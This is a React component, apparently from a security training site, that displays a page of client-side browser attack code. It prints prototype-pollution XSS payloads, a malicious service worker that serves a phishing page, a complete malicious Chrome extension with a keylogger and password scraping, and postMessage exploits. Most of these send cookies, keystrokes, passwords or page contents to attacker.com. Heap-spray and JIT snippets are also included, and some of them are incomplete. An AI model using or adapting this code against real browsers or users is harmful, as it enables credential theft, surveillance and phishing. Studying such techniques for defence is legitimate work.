
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Monitor } from 'lucide-react';

const ClientSideExploitation: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <div className="flex items-center gap-2">
          <Monitor className="h-6 w-6 text-cybr-primary" />
          <CardTitle className="text-cybr-primary">Client-Side Advanced Exploitation</CardTitle>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Advanced DOM XSS */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Advanced DOM XSS & Prototype Pollution</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Prototype Pollution to XSS Chain</h5>
            <p className="text-sm mb-3 opacity-80">
              Exploiting prototype pollution to achieve XSS execution in modern frameworks.
            </p>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// Step 1: Prototype Pollution
// URL: /?__proto__[innerHTML]=<img src=x onerror=alert(1)>
// Or JSON payload:
{
  "__proto__": {
    "innerHTML": "<img src=x onerror=alert('XSS')>",
    "onclick": "alert('Clicked')",
    "onerror": "fetch('//attacker.com/steal?cookie='+document.cookie)"
  }
}

// Step 2: Trigger polluted property usage
// Vulnerable code that uses polluted prototype:
function createDiv(data) {
  var div = document.createElement('div');
  div.innerHTML = data.content || div.innerHTML; // Prototype pollution triggers here
  return div;
}

// Advanced payload with sandbox escape:
{
  "__proto__": {
    "outerHTML": "<iframe src='javascript:parent.postMessage({type:\\"xss\\",payload:\\"document.cookie\\"}, \\"*\\")'></iframe>"
  }
}

// Prototype pollution in popular libraries:
// jQuery
$.extend(true, {}, JSON.parse('{"__proto__":{"test":"polluted"}}'));

// Lodash (older versions)
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'));

// React (development mode)
// Pollution via React DevTools
Object.prototype.dangerouslySetInnerHTML = {__html: '<img src=x onerror=alert(1)>'};`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Service Worker & Shared Worker Attacks</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// Malicious Service Worker registration
navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(\`
  self.addEventListener('fetch', function(event) {
    // Intercept all network requests
    if (event.request.url.includes('/login')) {
      // Phishing attack - serve fake login page
      event.respondWith(
        fetch('//attacker.com/fake-login.html')
      );
    }
    
    if (event.request.url.includes('/api/')) {
      // API manipulation
      event.respondWith(
        event.request.clone().text().then(function(body) {
          // Log API requests
          fetch('//attacker.com/log?api=' + encodeURIComponent(body));
          return fetch(event.request);
        })
      );
    }
  });
  
  // Persistent XSS via push notifications
  self.addEventListener('push', function(event) {
    event.waitUntil(
      self.registration.showNotification('Click me!', {
        body: 'You have a new message',
        icon: '//attacker.com/malicious.png',
        data: {
          url: 'javascript:alert(document.domain)'
        }
      })
    );
  });
\`));

// Shared Worker exploitation
var worker = new SharedWorker('data:text/javascript,' + encodeURIComponent(\`
  var ports = [];
  
  self.addEventListener('connect', function(e) {
    var port = e.ports[0];
    ports.push(port);
    
    port.onmessage = function(event) {
      // Broadcast to all connected tabs
      ports.forEach(function(p) {
        p.postMessage({
          type: 'xss',
          payload: '<img src=x onerror=alert(location.href)>'
        });
      });
    };
  });
\`));

// Web Worker with importScripts exploitation
var worker = new Worker('data:text/javascript,' + encodeURIComponent(\`
  // Import malicious scripts
  importScripts('//attacker.com/payload.js');
  
  self.onmessage = function(e) {
    // Process data and send back malicious payload
    self.postMessage({
      result: e.data,
      xss: '<script>parent.eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))</script>'
    });
  };
\`));`}
            </pre>
          </div>
        </div>

        {/* Browser-Specific Attacks */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Browser-Specific Attack Techniques</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Chrome Extension Exploitation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// Manifest.json for malicious extension
{
  "manifest_version": 3,
  "name": "Helpful Tool",
  "version": "1.0",
  "permissions": [
    "activeTab",
    "storage",
    "cookies",
    "webRequest",
    "webRequestBlocking",
    "<all_urls>"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}

// background.js - Intercept and modify requests
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    // Log all requests
    fetch('//attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({
        url: details.url,
        method: details.method,
        requestBody: details.requestBody
      })
    });

    // Redirect sensitive requests
    if (details.url.includes('/login')) {
      return {redirectUrl: 'https://attacker.com/phish'};
    }
  },
  {urls: ["<all_urls>"]},
  ["blocking", "requestBody"]
);

// content.js - DOM manipulation
// Inject keylogger into all pages
document.addEventListener('keydown', function(e) {
  fetch('//attacker.com/keylog', {
    method: 'POST',
    body: JSON.stringify({
      key: e.key,
      url: location.href,
      timestamp: Date.now()
    })
  });
});

// Extract stored credentials
if (document.querySelector('input[type="password"]')) {
  setTimeout(function() {
    // Try to extract autofilled passwords
    var passwords = Array.from(document.querySelectorAll('input[type="password"]'))
                        .map(input => input.value)
                        .filter(val => val.length > 0);
    
    if (passwords.length > 0) {
      fetch('//attacker.com/passwords', {
        method: 'POST',
        body: JSON.stringify(passwords)
      });
    }
  }, 2000);
}`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">JavaScript Engine Exploitation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// V8 JIT compilation abuse
// Force JIT compilation with hot functions
function hotFunction(x) {
    return x + 1;
}

// Call function many times to trigger JIT
for (let i = 0; i < 10000; i++) {
    hotFunction(i);
}

// Now exploit JIT assumptions
try {
    // Type confusion after JIT optimization
    hotFunction({valueOf: function() {
        // Side effect during optimization
        window.exploited = true;
        return 42;
    }});
} catch(e) {}

// Heap spraying technique
var spray = [];
var payload = "\\u4141\\u4141"; // Shellcode pattern

// Fill heap with controlled data
for (var i = 0; i < 1000000; i++) {
    spray[i] = payload.repeat(1000);
}

// Trigger vulnerability that gives memory control
// (This would be combined with a specific CVE)

// ArrayBuffer manipulation for memory corruption
var buffer = new ArrayBuffer(1024);
var view = new DataView(buffer);

// Write specific patterns to detect in memory
view.setUint32(0, 0x41414141, true);  // "AAAA"
view.setUint32(4, 0x42424242, true);  // "BBBB"

// Use in exploitation chain...

// WebAssembly (WASM) memory corruption
var wasmCode = new Uint8Array([
  // WASM bytecode that causes memory corruption
  0x00, 0x61, 0x73, 0x6d, // Magic number
  0x01, 0x00, 0x00, 0x00, // Version
  // ... more bytecode
]);

WebAssembly.instantiate(wasmCode).then(function(obj) {
    // Call WASM function that corrupts memory
    obj.instance.exports.exploit();
});`}
            </pre>
          </div>
        </div>

        {/* PostMessage Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">PostMessage & Origin Bypass Techniques</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Cross-Origin Communication Attacks</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// Origin validation bypass techniques
// 1. Subdomain confusion
window.addEventListener('message', function(event) {
    // Weak validation
    if (event.origin.endsWith('.trusted-domain.com')) {
        // Bypassed by evil.trusted-domain.com.attacker.com
        eval(event.data.code);
    }
});

// 2. Protocol confusion
window.addEventListener('message', function(event) {
    if (event.origin === 'https://trusted.com') {
        // Can be bypassed with data: or javascript: schemes
        document.write(event.data);
    }
});

// 3. Wildcard origin acceptance
window.addEventListener('message', function(event) {
    // No origin validation - accepts from anywhere
    if (event.data.type === 'command') {
        window[event.data.func](event.data.args);
    }
});

// Exploitation iframe
var iframe = document.createElement('iframe');
iframe.src = 'https://victim.com/vulnerable-page';
document.body.appendChild(iframe);

iframe.onload = function() {
    // Send malicious message
    iframe.contentWindow.postMessage({
        type: 'command',
        func: 'eval',
        args: 'alert(document.domain + " - " + document.cookie)'
    }, '*');
    
    // Chain multiple commands
    setTimeout(function() {
        iframe.contentWindow.postMessage({
            type: 'command',
            func: 'fetch',
            args: ['//attacker.com/exfil', {
                method: 'POST',
                body: document.documentElement.outerHTML
            }]
        }, '*');
    }, 1000);
};

// Advanced: Message relay attack
// Victim page with relaxed validation
window.addEventListener('message', function(event) {
    if (event.origin.includes('trusted')) {
        // Forward to child frame
        document.getElementById('child').contentWindow.postMessage(
            event.data, 
            'https://child.trusted.com'
        );
    }
});

// Attacker registers trusted-looking domain and relays messages
// attacker-trusted.com relays to legitimate child frame`}
            </pre>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default ClientSideExploitation;
